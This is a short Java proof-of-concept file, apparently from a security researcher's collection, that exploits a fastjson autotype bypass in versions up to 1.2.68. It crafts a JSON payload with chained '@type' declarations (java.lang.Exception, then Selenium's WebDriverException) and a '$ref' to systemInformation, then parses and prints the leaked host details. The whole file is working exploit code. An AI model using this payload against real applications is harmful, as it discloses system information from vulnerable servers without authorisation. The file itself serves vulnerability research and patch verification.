package com.threedr3am.bug.fastjson.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

/**
 * bypass autotype <= 1.2.68
 */
public class seleniumBypassAutotype1_2_68 {

    public static void main(String[] args) {

        String payload = "\n"
            + "{\n"
            + "    \"name\":\"tony\",\n"
            + "    \"email\":\"tony@qq.com\",\n"
            + "    \"content\":{\"$ref\":\"$x.systemInformation\"},\n"
            + "    \"x\":{\n"
            + "                \"@type\":\"java.lang.Exception\",\"@type\":\"org.openqa.selenium.WebDriverException\"\n"
            + "          }\n"
            + "}";
        try {
            JSONObject jsonObject = JSON.parseObject(payload);
            System.out.println(jsonObject.getString("content"));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
